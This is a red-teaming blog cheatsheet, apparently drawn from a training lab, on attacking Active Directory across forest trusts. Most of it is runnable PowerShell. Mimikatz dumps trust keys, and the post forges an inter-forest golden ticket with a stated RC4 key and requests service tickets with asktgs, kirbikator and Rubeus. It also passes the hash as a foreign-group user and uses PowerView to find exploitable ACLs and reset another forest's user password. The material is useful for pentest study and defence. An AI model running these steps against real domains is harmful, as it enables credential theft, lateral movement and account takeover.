---
title: Across Forests cheatsheet
subtitle: Active Directory forests are the highest level of security boundary for network objects in the Active Directory tree and forest structure. Within this Active Directory hierarchy, a forest is considered the most important logical container in an Active Directory configuration.

# Summary for listings and search engines
summary: Active Directory forests are the highest level of security boundary for network objects in the Active Directory tree and forest structure. Within this Active Directory hierarchy, a forest is considered the most important logical container in an Active Directory configuration.

# Link this post with a project
projects: []

# Date published
date: '2022-09-15T00:00:00Z'

# Date updated
lastmod: '2022-09-15T00:00:00Z'

# Is this an unpublished draft?
draft: false

# Show this page in the Featured widget?
featured: false

# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
image:
  caption: 'Image credit: [**Giovanni Pecoraro**](https://unsplash.com/photos/CpkOjOcXdUY)'
  focal_point: ''
  placement: 2
  preview_only: false

authors:
  - admin

tags:
  - Red Teaming
  - Windows
  - Active Directory
  - Forests
  
categories:
  - Cyber Security
  - Red Teaming

---

## Using Trust Tickets

Trust relationship across forests needs to be established (are not implicit) since a forest is a security boundary. We can only access resources and/or services that have been shared with the domain we have compromised (our source domain). Use e.g BloodHound to look for foreign group memberships between forests.

1. Once again, we require the trust key for the inter-forest trust:
    
    ```powershell
    # Invoke-Mimikatz
    Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName "cyberlab-dc.cyberlab.cybercorp.local"
    # or
    Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName "cyberlab-dc.cyberlab.cybercorp.local"
    ```
    
2. An inter-forest TGT can be forged:
    
    ```powershell
    # Invoke-Mimikatz
    Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:evilcorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi
    ```
    
3. Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket. Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well.
    
    ```powershell
    # asktgs.exe
    .\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/evilcorp-dc.evilcorp.local
    ```
    
4. Use the TGS to access the targeted service.
    
    ```powershell
    # kirbikator.exe
    .\kirbikator.exe lsa .\CIFS.evilcorp-dc.evilcorp.local.kirbi
    ```
    
5. Now you can access the trusted forest shares:
    
    ```powershell
    ls \\evilcorp-dc.evilcorp.local\forestshare
    ```
    
Alternatively, it is possible to use `Kekeo` to ask for the TGS:

```powershell
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi /service:CIFS/evilcorp-dc.evilcorp.local /dc:evilcorp-dc.evilcorp.local /ptt
```

## Search for Foreign Security Prinicpals

1. To search for Foreign Security Principals (users who have joined groups in the trusted domain but are part of the first domain) we can use the below PowerView command:
    
    ```powershell
    # PowerView
    Find-ForeignUser -Domain "evilcorp.local" -Verbose
    Find-ForeignGroup -Domain "evilcorp.local" -Verbose
    ```
    
2. We get an ObjectSID that we have to search in our current domain to see if it exists:
    
    ```powershell
    # PowerView
    Get-NetUser | ?{$_.objectsid -eq "S-1-5-21-738119705-704267045-3387619857-1275"}
    ```
    
3. The ObjectSID corresponds to STUDENT2. Let’s impersonate STUDENT2 who is a user of the domain cybercorp.local:
    
    ```powershell
    # Invoke-Mimikats
    Invoke-Mimikatz -Command '"sekurlsa::pth /user:STUDENT2 /domain:cybercorp.local /ntlm:6b164d3b190489426e9bcb4a01df5b53 /run:powershell.exe"'
    ```
    
4. Then we can access the other forest:
    
    ```powershell
    ls \\evil-dc.evilcorp.local\c$
    ```
    
## Search for interesting ACLs

1. Search for interesting ACLs in the evilcorp.local forest filtering the results belonging to users in our current domain:
    
    ```powershell
    Invoke-ACLScanner -Domain evilcorp.local | ?{$_.IdentitySID -match "S-1-5-21-738119705-704267045-3387619857"}
    ```
    
2. The user STUDENT1 in our cyberlab.cybercorp.local has GenericAll rights on STUDENT3 in evilcorp.local. This means, interesting stuff, like password reset can be done on STUDENT3 (using Powerview dev):
    
    ```powershell
    # PowerView_dev
    Set-DomainUserPassword -Identity STUDENT3 -AccountPassword (ConvertTo-SecureString "Password@123" –AsPlainText -Force) -Domain evilcorp.local -Verbose
    ```
---